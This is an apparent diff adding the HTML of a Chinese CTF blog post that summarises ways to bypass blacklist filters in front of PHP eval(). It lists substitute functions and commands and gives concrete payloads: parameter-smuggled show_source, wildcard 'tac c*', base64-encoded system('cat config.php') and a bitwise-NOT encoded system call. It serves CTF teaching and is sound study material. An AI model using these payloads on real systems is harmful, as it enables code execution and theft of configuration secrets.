@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP eval 绕过全总结 —— CTF 代码执行绕过手法 | YJZ's Security Lab</title><meta name="author" content="yjz-miao"><meta name="copyright" content="yjz-miao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="从函数名替换到位运算构造 payload，全面梳理 PHP eval 绕过手法与解题思路，附实战题对照。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP eval 绕过全总结 —— CTF 代码执行绕过手法">
+<meta property="og:url" content="https://yjz-miao.github.io/2026/06/10/Web%E5%AE%89%E5%85%A8/PHP-eval%E7%BB%95%E8%BF%87%E5%85%A8%E6%80%BB%E7%BB%93/">
+<meta property="og:site_name" content="YJZ&#39;s Security Lab">
+<meta property="og:description" content="从函数名替换到位运算构造 payload，全面梳理 PHP eval 绕过手法与解题思路，附实战题对照。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png">
+<meta property="article:published_time" content="2026-06-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-10T05:51:00.772Z">
+<meta property="article:author" content="yjz-miao">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="eval">
+<meta property="article:tag" content="代码执行">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="绕过技巧">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PHP eval 绕过全总结 —— CTF 代码执行绕过手法",
+  "url": "https://yjz-miao.github.io/2026/06/10/Web%E5%AE%89%E5%85%A8/PHP-eval%E7%BB%95%E8%BF%87%E5%85%A8%E6%80%BB%E7%BB%93/",
+  "image": "https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png",
+  "datePublished": "2026-06-09T16:00:00.000Z",
+  "dateModified": "2026-06-10T05:51:00.772Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "yjz-miao",
+      "url": "https://yjz-miao.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yjz-miao.github.io/2026/06/10/Web%E5%AE%89%E5%85%A8/PHP-eval%E7%BB%95%E8%BF%87%E5%85%A8%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP eval 绕过全总结 —— CTF 代码执行绕过手法',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fas fa-tools"></i><span> 工具</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">YJZ's Security Lab</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP eval 绕过全总结 —— CTF 代码执行绕过手法</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fas fa-tools"></i><span> 工具</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP eval 绕过全总结 —— CTF 代码执行绕过手法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-09T16:00:00.000Z" title="发表于 2026-06-10 00:00:00">2026-06-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-10T05:51:00.772Z" title="更新于 2026-06-10 13:51:00">2026-06-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">991</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><code>eval()</code> 是 CTF 中最常见的代码执行入口。围绕它的绕过本质上就是一场 <strong>出题人加过滤 vs 解题人绕过滤</strong> 的博弈。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;echo &#x27;hello&#x27;;&quot;</span>);  <span class="comment">// 把字符串当 PHP 代码执行</span></span><br></pre></td></tr></table></figure>
+
+<p>一切绕过只有一个目标：<strong>构造一个字面上不触发黑名单、语义上能执行恶意逻辑的字符串，送进 <code>eval()</code>。</strong></p>
+<hr>
+<h2 id="解题心智模型"><a href="#解题心智模型" class="headerlink" title="解题心智模型"></a>解题心智模型</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">拿到源码</span><br><span class="line">   │</span><br><span class="line">   ├─ 看 <span class="built_in">eval</span> 前面有什么过滤？</span><br><span class="line">   │    ├─ 正则白名单（必须含关键词）    → 只能选命中关键词的函数</span><br><span class="line">   │    ├─ 正则黑名单（不能含关键词）    → 找黑名单没封住的函数/命令</span><br><span class="line">   │    └─ 无过滤                     → 直接 <span class="built_in">eval</span>(<span class="string">&quot;system(&#x27;ls&#x27;)&quot;</span>) 秒</span><br><span class="line">   │</span><br><span class="line">   ├─ 标出黑名单里的每个词 → 逐个找替代方案</span><br><span class="line">   │</span><br><span class="line">   └─ 选最短的 payload → 打</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="绕过手法全分类"><a href="#绕过手法全分类" class="headerlink" title="绕过手法全分类"></a>绕过手法全分类</h2><h3 id="一、函数名绕过"><a href="#一、函数名绕过" class="headerlink" title="一、函数名绕过"></a>一、函数名绕过</h3><p>黑名单封了 <code>system</code> &#x2F; <code>exec</code> &#x2F; <code>highlight_file</code> 等函数名。</p>
+<p><strong>思路</strong>：换一个功能相同但名字不同的函数。</p>
+<table>
+<thead>
+<tr>
+<th>被封</th>
+<th>替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>highlight_file()</code></td>
+<td><code>show_source()</code></td>
+</tr>
+<tr>
+<td><code>system()</code></td>
+<td><code>passthru()</code> &#x2F; <code>shell_exec()</code> &#x2F; <code>`</code> 反引号</td>
+</tr>
+<tr>
+<td><code>exec()</code></td>
+<td><code>popen()</code> &#x2F; <code>proc_open()</code></td>
+</tr>
+<tr>
+<td><code>eval()</code></td>
+<td><code>assert()</code>（PHP ≤ 7.3）&#x2F; <code>call_user_func()</code> &#x2F; <code>create_function()</code>（PHP ≤ 7.2）</td>
+</tr>
+</tbody></table>
+<h3 id="二、Shell-命令绕过"><a href="#二、Shell-命令绕过" class="headerlink" title="二、Shell 命令绕过"></a>二、Shell 命令绕过</h3><p>黑名单封了 <code>cat</code> &#x2F; <code>ls</code> 等命令名。只在 payload 走 shell 路线时才相关。</p>
+<table>
+<thead>
+<tr>
+<th>被封</th>
+<th>替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cat</code></td>
+<td><code>tac</code> <code>nl</code> <code>more</code> <code>less</code> <code>head</code> <code>tail</code> <code>sort</code> <code>rev</code></td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td><code>dir</code> <code>find</code> <code>echo *</code></td>
+</tr>
+</tbody></table>
+<h3 id="三、参数内容绕过"><a href="#三、参数内容绕过" class="headerlink" title="三、参数内容绕过"></a>三、参数内容绕过</h3><p>黑名单封了 <code>config</code> &#x2F; <code>php</code> &#x2F; <code>.</code> 等文件名关键字，导致写不出 <code>config.php</code>。</p>
+<p><strong>思路 A</strong> —— 把敏感内容移到不检查的参数：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">c</span>=show_source($_GET[1])</span><br><span class="line">        ↑ 只含 show_source，干干净净</span><br><span class="line">&amp;<span class="attribute">1</span>=config.php</span><br><span class="line">        ↑ 别的参数不受正则检查</span><br></pre></td></tr></table></figure>
+
+<p><strong>思路 B</strong> —— 通配符：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=echo <span class="string">`tac c*`</span><span class="string">?&gt;</span>         ← * 匹配 config.php</span><br><span class="line"><span class="string">?c</span>=<span class="keyword">include</span>(<span class="string">&#x27;c*n?i?.?h?&#x27;</span>)<span class="string">?&gt;</span>  ← ? 单字符通配</span><br></pre></td></tr></table></figure>
+
+<p><strong>思路 C</strong> —— Base64 编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c3lzdGVt&#x27;</span>)(<span class="variable">$b</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;</span>))</span><br><span class="line"><span class="comment">// 执行 system(&quot;cat config.php&quot;)，但源码中不出现关键字</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="四、语法字符绕过"><a href="#四、语法字符绕过" class="headerlink" title="四、语法字符绕过"></a>四、语法字符绕过</h3><p>黑名单封了 <code>;</code> 导致无法终止语句。</p>
+<table>
+<thead>
+<tr>
+<th>被封</th>
+<th>替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td><code>?&gt;</code> 闭合 PHP 代码块</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>if(function(...))&#123;&#125;</code> 控制结构天然收尾</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td>靠 eval 收表达式：<code>eval(...)</code> 不需要分号</td>
+</tr>
+</tbody></table>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=echo <span class="string">`tac *`</span><span class="string">?&gt;</span>                ← <span class="string">?&gt;</span> 代 ;</span><br><span class="line"><span class="string">?c</span>=<span class="keyword">if</span>(passthru(<span class="string">&#x27;nl *&#x27;</span>))&#123;&#125;        ← &#123;&#125; 代 ;</span><br></pre></td></tr></table></figure>
+
+<h3 id="五、极端情况：无字母数字"><a href="#五、极端情况：无字母数字" class="headerlink" title="五、极端情况：无字母数字"></a>五、极端情况：无字母数字</h3><p>黑名单把所有 <code>a-zA-Z0-9</code> 全封了。</p>
+<p><strong>思路</strong>：用位运算（异或&#x2F;取反）「造」出字母。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%8</span>C<span class="variable">%86</span><span class="variable">%8</span>C<span class="variable">%8</span>B<span class="variable">%9</span>A<span class="variable">%92</span>)(~<span class="variable">%9</span>C<span class="variable">%9</span>E<span class="variable">%8</span>B<span class="variable">%DF</span><span class="variable">%D0</span><span class="variable">%99</span><span class="variable">%93</span><span class="variable">%9</span>E<span class="variable">%98</span>)<span class="comment">;</span></span><br><span class="line">// (~<span class="string">&quot;system&quot;</span>)(~<span class="string">&quot;cat flag&quot;</span>)，取反两次恢复原值</span><br></pre></td></tr></table></figure>
+
+<p>原理：PHP 中字符串与 <code>~</code> 运算符结合会对每个字符取反。将 <code>system</code> 逐字符取反得到不可打印字符，URL 编码后传入，PHP 运行时取反恢复为明文 <code>system</code>。</p>
+<h3 id="六、正则逻辑反转"><a href="#六、正则逻辑反转" class="headerlink" title="六、正则逻辑反转"></a>六、正则逻辑反转</h3><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>含义</th>
+<th>策略</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>preg_match(&quot;/.../&quot;, $c)</code></td>
+<td>命中则拦截（白名单）</td>
+<td>找命中关键词的函数</td>
+</tr>
+<tr>
+<td><code>!preg_match(&quot;/.../&quot;, $c)</code></td>
+<td>不命中则拦截（黑名单）</td>
+<td>找不命中关键词的函数</td>
+</tr>
+</tbody></table>
+<p>**注意区分 <code>preg_match</code> 前面有没有 <code>!</code>**，完全相反的思路。</p>
+<hr>
+<h2 id="实战题对照"><a href="#实战题对照" class="headerlink" title="实战题对照"></a>实战题对照</h2><p>以 ctfshow 的 web 方向为例，看看真实题目中这些手法如何组合：</p>
+<table>
+<thead>
+<tr>
+<th>题号</th>
+<th>正则逻辑</th>
+<th>新增过滤</th>
+<th>关键绕过</th>
+<th>考点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web9</td>
+<td>白名单</td>
+<td>—</td>
+<td><code>highlight_file()</code> 命中关键词</td>
+<td>白名单思维</td>
+</tr>
+<tr>
+<td>web10</td>
+<td>黑名单</td>
+<td>—</td>
+<td><code>show_source()</code> 不含关键词</td>
+<td><code>!</code> 取反</td>
+</tr>
+<tr>
+<td>web11</td>
+<td>黑名单</td>
+<td><code>cat</code></td>
+<td>走 PHP 函数不调 shell，<code>cat</code> 无效</td>
+<td>PHP vs Shell 边界</td>
+</tr>
+<tr>
+<td>web12</td>
+<td>黑名单</td>
+<td><code>\.</code> <code>php</code> <code>config</code></td>
+<td><code>show_source($_GET[1])</code> 参数传递</td>
+<td>作用域绕过</td>
+</tr>
+<tr>
+<td>web13</td>
+<td>黑名单</td>
+<td><code>;</code> <code>file</code></td>
+<td><code>echo \</code>tac *`?&gt;<code>+</code>?&gt;<code>代</code>;&#96;</td>
+<td>语法字符绕过</td>
+</tr>
+</tbody></table>
+<p>每道题都在上一层基础上加了新过滤，一层层叠起来就是完整的绕过进化路线。</p>
+<hr>
+<h2 id="一句话记口诀"><a href="#一句话记口诀" class="headerlink" title="一句话记口诀"></a>一句话记口诀</h2><blockquote>
+<p>封函数 → 换函数。封命令 → 换命令。封参数 → 换参数传。封字符 → <code>?&gt;</code> 闭合。全封死 → 位运算造。</p>
+</blockquote>
+<p>拿到题目先看正则类型，再瞄黑名单，沿着这条链一步步找替代，大部分 eval 绕过题都能解。更多对应尝试组合使用不同手法，实战中很少有只封一个点的题目。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yjz-miao.github.io">yjz-miao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yjz-miao.github.io/2026/06/10/Web%E5%AE%89%E5%85%A8/PHP-eval%E7%BB%95%E8%BF%87%E5%85%A8%E6%80%BB%E7%BB%93/">https://yjz-miao.github.io/2026/06/10/Web%E5%AE%89%E5%85%A8/PHP-eval%E7%BB%95%E8%BF%87%E5%85%A8%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://yjz-miao.github.io" target="_blank">YJZ's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/eval/">eval</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">绕过技巧</a></div><div class="post-share"><div class="social-share" data-image="https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/05/26/Web%E5%AE%89%E5%85%A8/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E6%80%BB%E8%A7%88/" title="XSS 跨站脚本攻击 —— 基础概念与三大类型总览"><img class="cover" src="https://img.picui.cn/free/2025/05/26/6653a8e2e9f2b.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XSS 跨站脚本攻击 —— 基础概念与三大类型总览</div></div><div class="info-2"><div class="info-item-1">XSS 核心概念、三大类型对比、常见 Payload、攻击场景、检测方法，一篇掌握 XSS 全貌。</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%BF%83%E6%99%BA%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">解题心智模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E5%85%A8%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">绕过手法全分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%87%BD%E6%95%B0%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">一、函数名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Shell-%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">二、Shell 命令绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E6%95%B0%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">三、参数内容绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%AF%AD%E6%B3%95%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">四、语法字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%9E%81%E7%AB%AF%E6%83%85%E5%86%B5%EF%BC%9A%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97"><span class="toc-number">2.5.</span> <span class="toc-text">五、极端情况：无字母数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%AD%A3%E5%88%99%E9%80%BB%E8%BE%91%E5%8F%8D%E8%BD%AC"><span class="toc-number">2.6.</span> <span class="toc-text">六、正则逻辑反转</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%A2%98%E5%AF%B9%E7%85%A7"><span class="toc-number">3.</span> <span class="toc-text">实战题对照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%AE%B0%E5%8F%A3%E8%AF%80"><span class="toc-number">4.</span> <span class="toc-text">一句话记口诀</span></a></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By yjz-miao</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div><div class="footer_custom_text"><i class="fas fa-shield-alt"></i> 以技为盾，守网安山河</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script src="/js/custom.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
